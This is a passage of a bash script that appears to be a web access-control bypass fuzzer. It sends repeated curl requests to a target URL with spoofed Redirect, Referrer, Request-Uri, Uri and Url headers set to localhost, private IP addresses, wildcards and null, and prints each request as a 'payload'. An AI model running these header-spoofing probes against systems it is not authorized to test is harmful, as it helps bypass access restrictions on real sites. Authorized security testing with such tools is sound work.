	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Redirect: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Redirect: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Redirect Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Redirect: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Redirect: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "Referrer Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referrer: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referrer: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referrer Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referrer: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referrer: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referrer Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referrer: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referrer: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referrer Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referrer: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referrer: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referrer Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referrer: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referrer: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referrer Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referrer: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referrer: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referrer Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referrer: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referrer: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referrer Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referrer: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referrer: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referrer Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referrer: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referrer: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referrer Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referrer: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referrer: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "Request-Uri Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Request-Uri: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Request-Uri: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Request-Uri Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Request-Uri: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Request-Uri: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Request-Uri Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Request-Uri: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Request-Uri: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Request-Uri Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Request-Uri: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Request-Uri: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Request-Uri Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Request-Uri: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Request-Uri: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Request-Uri Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Request-Uri: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Request-Uri: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Request-Uri Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Request-Uri: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Request-Uri: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Request-Uri Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Request-Uri: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Request-Uri: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Request-Uri Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Request-Uri: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Request-Uri: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Request-Uri Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Request-Uri: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Request-Uri: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "Uri Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Uri: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Uri: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Uri Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Uri: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Uri: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Uri Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Uri: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Uri: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Uri Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Uri: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Uri: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Uri Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Uri: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Uri: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Uri Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Uri: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Uri: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Uri Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Uri: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Uri: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Uri Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Uri: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Uri: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Uri Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Uri: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Uri: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Uri Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Uri: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Uri: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "Url Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Url: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Url: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Url Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Url Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Url: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Url: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Url Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Url: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Url: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Url Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Url: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Url: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Url Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Url: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Url: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Url Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Url: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Url: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Url Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Url: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
